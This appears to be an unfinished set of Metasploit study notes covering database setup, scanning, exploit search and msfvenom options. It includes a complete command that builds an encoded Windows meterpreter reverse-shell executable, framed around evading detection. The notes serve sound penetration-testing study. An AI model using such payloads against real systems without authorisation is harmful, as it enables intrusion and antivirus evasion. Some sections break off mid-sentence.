## Metasploit
Metasploit is a widely used penetration testing framework that helps find, exploit, and validate vulnerabilities in systems. To open Metasploit, type `msfconsole` in the terminal.

### Connecting to a database
Metasploit can connect to a PostgreSQL database. To set up and initialize the database, run `msfdb init` in bash. After launching Metasploit with `msfconsole`, you can verify the database connection with the `db_status` command.

See [Metasploit Database](#metasploit-database) for more details.

Once connected to the database, you can view the vulnerabilities from your scan with `vulns`
### Scanning
The goal of scanning is to learn more about the machine, so you can plan your attack.

`db_nmap` will do an nmap scan and save the results in your metasploit database.

### Exploitation
The goal of exploitation is to use a vulnerability to access the machine. 

#### Choosing an exploit
##### Searching
Type `vulns` to view the vulnerabilities your scan found.

Now use the `search` command to figure out which metasploit modules can exploit what you found. 

To search for exploits on windows, you could type `search -t exploit -p windows`

`-t` is type. It can distinguish between metasploit's different offerinsgs, such as: `exploit, payload, post, auxiliary, encoder, nop`

Some other useful parameters:
+ `--cve` filter by CVE identifier
+ `-o` order the results. Can do it by `rank`, `name`, 
+ `author` to search by a particular author, i.e. `rapid7`

For example, to search by cve, type `search --cve CVE-2021-12345`

##### Using a search result
From the search results, to use the exploit labeled `0`, type `use 0`

Then type `show options` to view what parameters need to be set.

To set a parameter, you can type `set <Parameter Name> <value>` and `unset <Parameter Name>`

#### Types of payloads
The exploit will get you onto the system. But what do you do once you get in? A simple payload is the 

### Post-Exploitation
Post-exploitation's goals are pretty open ended. You can try to maintain persistence, pivot around the network, etc.

### Msf Venom
Use `-l` to list the payloads
```bash
msfvenom -l payloads
```

#### Encoders
```bash
msfvenom -l encoders
```

##### Example Command
```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -b "\x00" -e x86/shikata_ga_nai -i 5 -f exe > output.exe
```

###### Architecture
`-a x86`: Specifies the architecture of the payload. You can also try
+ `x64` For 64-bit systems.
+ `armle` For little-endian ARM systems.
+ `mipsbe` For big-endian MIPS systems.

###### Platform
`--platform Windows`: Specifies the platform of the payload. You can also try
+ `Linux`: For Linux systems.
+ `Android`: For Android devices.
+ `OSX`: For Appleâ€™s macOS systems.

###### Payload
`-p windows/meterpreter/reverse_tcp`: Specifies the payload to generate.

###### LHOST
`LHOST=<Your IP>`: Sets the IP address for the payload to connect back to.

###### LPORT
`LPORT=<Your Port>`: Sets the port for your system to listen on.

###### Characters to avoid
`-b "\x00"`: Specifies a list of characters to avoid in the payload. Also can try: 

- `-b "\x00"`: Avoid characters in the payload.
- `\x00`: Null byte; terminates strings.
- `\x0A`: Line feed; can end commands in UNIX.
- `\x0D`: Carriage return; signals end of data in Windows.
- `\x20`: Space; can alter script or command behavior.

`-e x86/shikata_ga_nai`: Specifies the encoder to use on the payload.

###### Payload Format
See: `msfvenom --help-formats`

- `-f exe`: Windows executable format, ideal for direct execution on Windows systems.
- `-f elf`: ELF binary for Linux systems.
- `-f war`: Java Web Archive, targets Java-based server applications.
- `-f asp`: ASP script for older IIS servers.
- `-f php`: PHP script for web servers supporting PHP execution.
- `-f python`: Python script for systems with Python available.
- `-f js_be`: JavaScript for browser exploit scenarios.
- `-f raw`: Raw shellcode for direct injection or exploit development.
- `-f dll`: Windows Dynamic Link Library, suitable for DLL injection/hijacking.

- `-i 5`: Specifies the number of times to encode the payload. Multiple encodings help evade simple detections, but overdoing can bloat the payload. Typically, 2-5 iterations balance evasion and size. Five offers obfuscation without excessive bloating.

### Metasploit database
Metasploit uses a PostgreSQL database by default. You can run it with `msfdb init`. You can confirm you are connected to the database by running `db_status` inside metrepreter.
More information can be found here: <https://docs.metasploit.com/docs/using-metasploit/intermediate/metasploit-database-support.html> 

Some common commands:

- **Workspace Management**:
  - `workspace`: Lists all workspaces.
  - `workspace [name]`: Switches to or creates a new workspace.
  
- **Host Management**:
  - `hosts`: Lists all hosts.
  - `hosts -d [ip]`: Deletes a specific host.
  
- **Service Management**:
  - `services`: Lists all services.
  
- **Vulnerability Management**:
  - `vulns`: Lists vulnerabilities.
  
- **Note Management**:

### Nmap Alternatives
Nmap is useful for discovering devices on a network and finding open ports.

Tools like Nessus and Greenbone are used for vulnerability scanning.
